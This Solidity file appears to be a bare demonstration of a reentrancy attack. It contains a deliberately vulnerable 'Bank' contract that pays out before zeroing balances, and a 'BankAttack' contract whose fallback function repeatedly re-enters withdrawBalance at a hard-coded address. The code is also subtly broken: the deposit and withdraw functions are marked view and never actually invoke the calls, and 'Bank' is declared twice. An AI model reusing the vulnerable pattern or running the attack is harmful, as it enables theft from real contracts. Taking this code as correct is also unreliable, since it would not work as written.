pragma solidity ^0.5.0;

contract Bank {
    mapping(address=>uint) userBalances;

    function addToBalance() public payable {
        userBalances[msg.sender] = userBalances[msg.sender] + msg.value;
    }

    function withdrawBalance() public {
        uint amountToWithdraw = userBalances[msg.sender];
        if (!msg.sender.call.value(amountToWithdraw)()){
            revert();
        }
        userBalances[msg.sender] = 0;
    }

    function getBalance() public returns (uint){
        return address(this).balance;
    }
}
 
pragma solidity ^0.5.0;

contract BankAttack {
    address bankAddr = 0xB23e0BFaEedCFCE82Ea2011f2A2726584e611e57;
    uint attackCount = 2;

    function() external payable{
        while(attackCount > 0){
           attackCount --;
            Bank bank = Bank(bankAddr);
            bank.withdrawBalance();
        }
    }  

    function deposit() public view{
        Bank bank = Bank(bankAddr);
        bank.addToBalance.value(10);
    }

    function withdraw() public view{
        Bank bank = Bank(bankAddr);
        bank.withdrawBalance;
    }

    function getBalance() public view returns (uint){
        return address(this).balance;
    }
}

interface Bank{
    function addToBalance() external payable;
    function withdrawBalance() external;
}